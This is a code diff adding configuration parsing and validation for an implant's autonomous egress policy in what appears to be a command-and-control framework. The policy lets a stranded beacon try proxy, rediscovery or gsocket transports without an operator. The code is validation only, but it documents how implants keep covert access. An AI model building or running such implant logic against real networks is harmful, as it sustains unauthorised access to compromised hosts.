@@ -1809,6 +1809,380 @@ def _rescue_class_of(exc: BaseException) -> int:
     return _RESCUE_CLASSES["unreachable"]
 
 
+# ── The egress decider's policy, as the implant reads it ──
+#
+# `c2.egress_decider` of configs/raccoon.yaml: what an implant that cannot
+# reach its team server may try on its own, in the operator's order, when
+# nobody can be reached to be asked. This section **reads** that block and
+# **refuses** one that cannot work. Choosing a rule from it is not here --
+# nothing below matches a rescue record or spends the budget.
+#
+# Why every refusal below is a log line and a disabled policy, never an
+# exception. `tunnel_config_from_yaml` above raises, and can afford to:
+# `beacon_config_from_fallback` catches it, leaves the block out and the
+# beacon still starts, because "the beacon is the access and the tunnel is
+# the convenience". There is nothing below the beacon to catch a policy
+# that stopped it, so a refusal here would have cost the access in order to
+# protect the policy -- on a dropped device, the worst trade available. A
+# block that is absent, incomplete or unusable therefore reads as **off,
+# with the reason logged once**, which is how the five transports already
+# behave and what the design requires of this one.
+#
+# Why the refusing happens *here*, when the block is read, rather than when
+# a rule would have fired: the moment a rule fires is a stuck cycle on a
+# host nobody can reach, which is the worst possible moment to discover
+# that a policy is unusable. `tunnel_config_from_yaml` made the same call
+# about a `psk` in the file -- refused whether the tunnel is enabled or not
+# -- and the rules here are read whether the decider is enabled or not for
+# the same reason: a trap in a disabled block is a trap waiting for the day
+# somebody enables it, and the shipped block *is* disabled.
+#
+# One call, one log line: the first problem found is the one reported, and
+# a stuck implant is not the place to enumerate an operator's typos.
+
+# The three verbs a rule may name, which is the gate the operator cannot
+# widen: configuration selects from this tuple and orders it. `_exec_egress`
+# dispatches exactly these three sub-verbs; a test holds the two together,
+# because a verb here that the beacon does not have would be a rule that
+# can never fire, and a sub-verb there that is missing here is one the
+# decider cannot reach.
+EGRESS_VERBS = ("proxy", "rediscover", "gsocket")
+
+# The flag names a `when` may say, and the bit each one is -- a copy of
+# dns_rescue's FLAG_*, like `_RESCUE_CLASSES` above and for the same reason.
+# The bit travels with the name so that whatever matches these rules next
+# has one mapping to read rather than a second copy of these names.
+_EGRESS_FLAG_BITS = {
+    "proxy_found": _RESCUE_FLAG_PROXY_FOUND,
+    "dns_answered": _RESCUE_FLAG_DNS_ANSWERED,
+}
+
+# The two that are declared and never set. Both are in the record format
+# and both are rendered by the team server, so an operator reading the
+# panel has every reason to think they are usable -- but `_rescue_flags` ORs
+# in `proxy_found` and `dns_answered` and nothing else, because no 802.1X
+# sensing and no captive-portal detection exists on this implant. A rule
+# naming one of these could never match, and a rule that can never fire is
+# a trap in the one file nobody can debug remotely. So they are refused by
+# name, with the reason, rather than tolerated or silently dropped: an
+# operator who read "not a flag" would go looking for a typo and find none.
+#
+# Making them live is the obvious follow-up to this work, and the day it
+# happens the two names move into the mapping above. The bits are kept here
+# so the copy-comparison test can hold all four against `dns_rescue.py`.
+_EGRESS_DEAD_FLAGS = {
+    "dot1x_seen": _RESCUE_FLAG_DOT1X_SEEN,
+    "portal_answered": _RESCUE_FLAG_PORTAL_ANSWERED,
+}
+
+# What the block may contain, and what a rule may contain. Anything else is
+# refused by name: `budgte: 3` would otherwise leave the budget at its
+# default with nothing saying so, on a host whose operator cannot read the
+# file and the log together.
+_EGRESS_BLOCK_KEYS = ("enabled", "budget", "rules")
+_EGRESS_RULE_KEYS = ("when", "try")
+
+# The two `when` keys that are not a transport name. `any` is "any
+# transport carrying one of these classes"; `flags` is the record's flag
+# byte. Both are the design's spelling.
+_EGRESS_WHEN_ANY = "any"
+_EGRESS_WHEN_FLAGS = "flags"
+
+# Everything a `when` may name. The transports are `_RESCUE_TRANSPORTS` and
+# not `_FALLBACK_TRANSPORTS`, even though the two hold the same five names:
+# what a rule reads is the rescue record's evidence, so the record's
+# vocabulary is the one that belongs here. A test holds the two tuples
+# equal, so a leg added to one and not the other fails loudly instead of
+# becoming a transport no rule can name.
+_EGRESS_WHEN_KEYS = _RESCUE_TRANSPORTS + (_EGRESS_WHEN_ANY,
+                                          _EGRESS_WHEN_FLAGS)
+
+# Attempts per stuck window when the block names no number. Three, because
+# there are three verbs, so the default is one attempt each. Defaulted
+# rather than refused because a forgotten line should not turn a policy
+# into a dead one -- but never *unbounded*, which is what an absent budget
+# would mean if this were zero or None.
+#
+# There is deliberately no upper bound. One attempt per cycle is the
+# design's rule, so a large number is bounded in time by the beacon
+# interval anyway, and a cap would be a number in this file with no reason
+# behind its particular value that an operator with a reason could not
+# pass. The gate -- the thing configuration may not widen -- is about
+# *which* verbs, not how many times.
+_EGRESS_DEFAULT_BUDGET = 3
+
+
+def _egress_disabled() -> dict:
+    """The shape a refusal returns: off, nothing to choose, nothing to spend.
+
+    A fresh dict each time rather than a module-level constant, because a
+    shared one handed to a caller is a mapping somebody can mutate into
+    every later reader's default.
+
+    `budget` is 0 and `rules` is empty on purpose. A refused policy that
+    carried the operator's rules and number would leave a later reader
+    which forgot to check `enabled` with something to choose from and
+    something to spend; this way the refusal still holds. Two lines of
+    belt and braces, in the one file nobody can debug remotely.
+    """
+    return {"enabled": False, "budget": 0, "rules": []}
+
+
+def read_egress_policy(block) -> dict:
+    """Read `c2.egress_decider`, or say once why it cannot be used.
+
+    Returns `{"enabled": bool, "budget": int, "rules": [...]}`, always all
+    three keys, where each rule is `{"when": {...}, "try": "<verb>"}` with
+    every `when` value normalised to a list of names. Never raises: see the
+    section comment above for why a refusal on an implant is a log line.
+
+    `block` is whatever the YAML held, including None for a deployment that
+    predates this feature -- which reads as off and says nothing, because
+    there is nothing for an operator to fix and nothing to tell them.
+
+    A `when` may carry several keys at once, and they are read as *all of
+    them have to hold*. That was left to the builder, and it is recorded
+    here rather than in whatever matches these rules next: `{https: [...],
+    flags: [...]}` is the first thing an operator writes, refusing it would
+    be pedantry, and the other reading -- any key is enough -- would let a
+    rule fire on evidence the operator did not describe. Adding a key can
+    only narrow, which is the reading that cannot surprise somebody who is
+    not there to be surprised.
+    """
+    if block is None:
+        return _egress_disabled()
+    try:
+        return _egress_policy(block)
+    except ValueError as exc:
+        # Once, where the config is built, and then the policy is off.
+        # Nothing rereads the block, so this is one line per start and not
+        # one per stuck cycle -- the arrangement the gsocket leg's latched
+        # reason already has.
+        logger.warning("The egress decider is off: %s", exc)
+        return _egress_disabled()
+
+
+def _egress_policy(block) -> dict:
+    """`read_egress_policy`'s reading, raising a ValueError on anything bad.
+
+    Split out so that each refusal is one `raise` naming its own offending
+    value, instead of a problem string threaded through twenty returns.
+    The caller is the one that turns a raise into a log line, exactly as
+    `beacon_config_from_fallback` does for the tunnel.
+    """
+    if not isinstance(block, dict):
+        raise ValueError(
+            "c2.egress_decider is %r, which is not a mapping of %s"
+            % (block, ", ".join(_EGRESS_BLOCK_KEYS)))
+    unknown = [key for key in block if key not in _EGRESS_BLOCK_KEYS]
+    if unknown:
+        raise ValueError(
+            "c2.egress_decider has %s, which is not a setting it has: it "
+            "takes %s"
+            % (", ".join(repr(key) for key in unknown),
+               ", ".join(_EGRESS_BLOCK_KEYS)))
+
+    # Read by value and never as `bool(...)`, for the reason the gsocket
+    # leg records at its own `enabled`: `bool("false")` is True and YAML
+    # does not unquote a quoted scalar, so `enabled: "false"` would switch
+    # on an autonomous decider out of a file that says the opposite. Here
+    # it is refused rather than quietly read as off, because this setting
+    # is the whole difference between an implant that acts on its own and
+    # one that does not.
+    raw_enabled = block.get("enabled", False)
+    if not isinstance(raw_enabled, bool):
+        raise ValueError(
+            "c2.egress_decider.enabled is %r, and only the boolean true "
+            "enables it -- an unquoted true or false is what this setting "
+            "takes" % (raw_enabled,))
+
+    budget = _egress_budget(block.get("budget", _EGRESS_DEFAULT_BUDGET))
+    rules = _egress_rules(block.get("rules"))
+    if raw_enabled and not rules:
+        raise ValueError(
+            "c2.egress_decider is enabled and its rules are %r, so it could "
+            "only ever decide nothing: a policy that cannot fire is refused "
+            "rather than left looking switched on. Say enabled: false if "
+            "that is what is meant" % (block.get("rules"),))
+    return {"enabled": raw_enabled, "budget": budget, "rules": rules}
+
+
+def _egress_budget(raw) -> int:
+    """How many attempts a stuck window may spend."""
+    # `isinstance(True, int)` is True in Python, so a stray YAML boolean
+    # would otherwise read as one attempt out of a file that names no
+    # number at all. Refused rather than taken, because a budget is the
+    # bound on an implant acting with nobody watching.
+    if isinstance(raw, bool) or not isinstance(raw, int):
+        raise ValueError(
+            "c2.egress_decider.budget is %r, which is not a whole number of "
+            "attempts" % (raw,))
+    if raw < 1:
+        raise ValueError(
+            "c2.egress_decider.budget is %r, and a policy with no attempts "
+            "to spend decides nothing while the file says it is on: say "
+            "enabled: false if that is what is meant" % (raw,))
+    return raw
+
+
+def _egress_rules(raw) -> List[dict]:
+    """The rules, in the operator's order, each one read or the lot refused.
+
+    The order is the policy -- the first matching rule is the attempt --
+    so nothing here sorts or de-duplicates: that would be a different
+    policy from the one in the file.
+
+    Absent is an empty list and not an error. Whether that is usable
+    depends on `enabled`, which is the caller's to judge.
+    """
+    if raw is None:
+        return []
+    if not isinstance(raw, list):
+        raise ValueError("c2.egress_decider.rules is %r, which is not a "
+                         "list of rules" % (raw,))
+    return [_egress_rule(item, index)
+            for index, item in enumerate(raw, 1)]
+
+
+def _egress_rule(item, index: int) -> dict:
+    """One rule: a condition and the verb to try when it holds.
+
+    `index` is the rule's position as the operator counts it, from 1. Every
+    refusal carries it: a file with three rules and one of them wrong needs
+    to say which, since whoever has to fix it cannot read this log and the
+    file at the same time.
+    """
+    where = "c2.egress_decider.rules[%d]" % index
+    if not isinstance(item, dict):
+        raise ValueError("%s is %r, which is not a mapping of %s"
+                         % (where, item, ", ".join(_EGRESS_RULE_KEYS)))
+    unknown = [key for key in item if key not in _EGRESS_RULE_KEYS]
+    if unknown:
+        raise ValueError(
+            "%s has %s, which is not part of a rule: a rule is a 'when' and "
+            "a 'try'"
+            % (where, ", ".join(repr(key) for key in unknown)))
+
+    verb = item.get("try")
+    if verb is None:
+        raise ValueError("%s names no 'try', so nothing would happen if it "
+                         "matched" % where)
+    if verb not in EGRESS_VERBS:
+        # The allowed set is a list and not a judgement: a policy may
+        # choose from it and order it, and may not add to it. `sleep` is
+        # the refusal that matters -- a verb the beacon really has, and the
+        # one the team server reaches for on a stuck beacon, where there is
+        # an operator to be asked about slowing an implant's check-ins.
+        raise ValueError(
+            "%s.try is %r, which is not one of the three verbs a policy may "
+            "name: %s. The allowed set is fixed in the implant -- a policy "
+            "chooses from it and orders it, and cannot add to it"
+            % (where, verb, ", ".join(EGRESS_VERBS)))
+    return {"when": _egress_when(item.get("when"), where), "try": verb}
+
+
+def _egress_when(raw, where: str) -> Dict[str, List[str]]:
+    """A rule's condition: transports, `any` and `flags`, each with names.
+
+    Every value is normalised to a list, so a single name may be written
+    without one -- `when: {https: refused}` is what a hand writes, and the
+    one-element list is noise. What reads these next sees one shape.
+    """
+    if raw is None:
+        raise ValueError(
+            "%s names no 'when', and a rule with no condition would fire on "
+            "every stuck cycle: an unconditional autonomous attempt is "
+            "spelled out in this file or not made" % where)
+    if not isinstance(raw, dict):
+        raise ValueError("%s.when is %r, which is not a mapping" % (where, raw))
+    if not raw:
+        raise ValueError(
+            "%s.when is empty, and a rule with no condition would fire on "
+            "every stuck cycle: name a transport (%s), %r or %r"
+            % (where, ", ".join(_RESCUE_TRANSPORTS), _EGRESS_WHEN_ANY,
+               _EGRESS_WHEN_FLAGS))
+
+    when = {}
+    for key, value in raw.items():
+        # The type first, so an unhashable key out of a YAML complex
+        # mapping is named rather than raising a TypeError from `in`.
+        if not isinstance(key, str) or key not in _EGRESS_WHEN_KEYS:
+            raise ValueError(
+                "%s.when names %r, which is neither a transport (%s) nor %r "
+                "nor %r"
+                % (where, key, ", ".join(_RESCUE_TRANSPORTS),
+                   _EGRESS_WHEN_ANY, _EGRESS_WHEN_FLAGS))
+        field = "%s.when.%s" % (where, key)
+        names = _egress_names(value, field)
+        for name in names:
+            if key == _EGRESS_WHEN_FLAGS:
+                _egress_check_flag(name, field)
+            else:
+                _egress_check_class(name, field)
+        when[key] = names
+    return when
+
+
+def _egress_names(value, where: str) -> List[str]:
+    """One name or a list of them, as a list. Empty is refused."""
+    names = [value] if isinstance(value, str) else value
+    if not isinstance(names, list) or not names:
+        raise ValueError(
+            "%s is %r, so it could never match: it takes one name or a list "
+            "of them" % (where, value))
+    for name in names:
+        if not isinstance(name, str):
+            raise ValueError("%s names %r, which is not a name" % (where, name))
+    return list(names)
+
+
+def _egress_check_class(name: str, where: str) -> None:
+    """Refuse a class name the rescue record does not have.
+
+    Class names rather than numbers, because the operator reads
+    `auth_required` and not `7` -- which is also what makes a typo the
+    likely failure here, and why the message carries the classes that do
+    exist. The names are `_RESCUE_CLASSES`, the copy of `dns_rescue.CLASSES`
+    this file already carries for the record itself, so there is one
+    vocabulary and not two.
+
+    A class only one leg ever records -- `answered` is DNS's, and
+    `binary_missing` is the carrier's -- is *not* refused for another
+    transport. It is a true statement about that leg that simply does not
+    happen to arise, which is a different thing from the two dead flag
+    names: those cannot be set by any leg at all, ever.
+    """
+    if name not in _RESCUE_CLASSES:
+        raise ValueError(
+            "%s names %r, which is not one of the rescue classes: %s"
+            % (where, name,
+               ", ".join(sorted(_RESCUE_CLASSES, key=_RESCUE_CLASSES.get))))
+
+
+def _egress_check_flag(name: str, where: str) -> None:
+    """Refuse a flag name the beacon never sets, and say why.
+
+    The two dead names get their own message. "not a flag" would send an
+    operator looking for a typo in a name they read in the panel, so the
+    message says what nothing on this implant does. Both messages name the
+    live flags in the record's own bit order rather than alphabetically,
+    which is the order the operator reads them in `dns_rescue.py`.
+    """
+    if name in _EGRESS_DEAD_FLAGS:
+        raise ValueError(
+            "%s names %r, which nothing in this implant ever sets: it is in "
+            "the rescue record's format and the team server renders it, but "
+            "no 802.1X sensing and no captive-portal detection exists here, "
+            "so only %s are ever set. A rule that could never match is "
+            "refused rather than carried"
+            % (where, name, " and ".join(_EGRESS_FLAG_BITS)))
+    if name not in _EGRESS_FLAG_BITS:
+        raise ValueError(
+            "%s names %r, which is not a flag the rescue record carries: it "
+            "is %s"
+            % (where, name, " or ".join(_EGRESS_FLAG_BITS)))
+
+
 def tunnel_config_from_yaml(c2_cfg: dict, env=None) -> Optional[dict]:
     """Build the endpoint's `tunnel` block from `c2.tunnel`, or None.
 
@@ -1926,6 +2300,15 @@ def beacon_config_from_fallback(c2_cfg: dict, dropbox: bool = True,
     `c2.tunnel` of the config this returns, which is where both `Beacon`
     and `TunnelEndpoint` look for it.
 
+    `c2.egress_decider` comes through `read_egress_policy` and lands at
+    `c2.egress_decider` beside it. Neither is a transport, so neither is
+    in the loop over `_FALLBACK_TRANSPORTS`. The decider block is **always**
+    present in what this returns, unlike the tunnel's: the reader cannot
+    fail, so a key that was sometimes absent would only make every later
+    reader write `.get("egress_decider") or {}` and get the default wrong
+    once. It is read from `c2` and not from `c2.fallback`, because the
+    fallback block is the five legs and a policy is not a leg.
+
     **A tunnel this host cannot run does not cost it its beacon, and does
     not lose its reason either.** That loader refuses a block it cannot
     make, naming the field. Here the block is left out -- it is the only
@@ -1954,6 +2337,11 @@ def beacon_config_from_fallback(c2_cfg: dict, dropbox: bool = True,
     }
     for transport in _FALLBACK_TRANSPORTS:
         block[transport] = fallback.get(transport, {})
+    # Not a transport, so not in the loop above. A policy that cannot be
+    # used reads as off with its reason logged, and never raises: the
+    # beacon is the access, and a refusal that stopped it would have cost
+    # that access in order to protect a policy.
+    block["egress_decider"] = read_egress_policy(c2_cfg.get("egress_decider"))
     try:
         tunnel = tunnel_config_from_yaml(c2_cfg, env=env)
     except ValueError as exc:
